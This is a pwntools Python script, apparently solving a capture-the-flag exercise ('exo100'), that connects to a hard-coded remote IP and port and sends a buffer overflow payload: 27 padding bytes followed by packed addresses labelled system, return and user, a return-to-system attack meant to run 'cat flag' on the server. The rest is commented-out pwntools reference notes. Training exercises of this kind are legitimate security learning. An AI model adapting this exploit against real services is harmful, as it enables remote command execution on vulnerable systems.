from pwn import * # CONNECT:
target = remote("51.15.171.241", 9005) # TCP connection on port 9000
# target = process("./exo") # launch exercise exo100
# netcat ip port
# SEND & RECV:
# read("shell")
buf = b'cat flag'

target.sendline(buf)
#print(target.recvline())

buf = b'1'
target.sendline(buf)

buf = b'a' * 27
buf += p32(0x080490C0) # system
buf += p32(0x0804C0A8) # return system
buf += p32(0x0804C06C) # user
target.sendline(buf)
#target.send(fd.read()) # send hello to target
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())



# target.send(b"AA") # send hello to target
#target.sendline("hello") # send hello\n to target
print(target.recvline()) # recv a line from target
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
print(target.recvline())
#print(target.recvuntil("world")) # recv until "world" is read

# PACK & UNPACK:
#p32(0xAABBCCDD) # pack little endian 32bits
#u32(b"\xDD\xCC\xBB\xAA") # unpack little endian 32 bits
#p64(0xAABBCCDDEEFF9988) # pack little endian 64bits
#u64(b"\x88\x99\xFF\xEE\xDD\xCC\xBB\xAA") # unpack little endian 64 bits

# FINAL EXAMPLE:
#target.send(p64(0xAABBCCDD))
#target.interactive() # direct interaction with the target!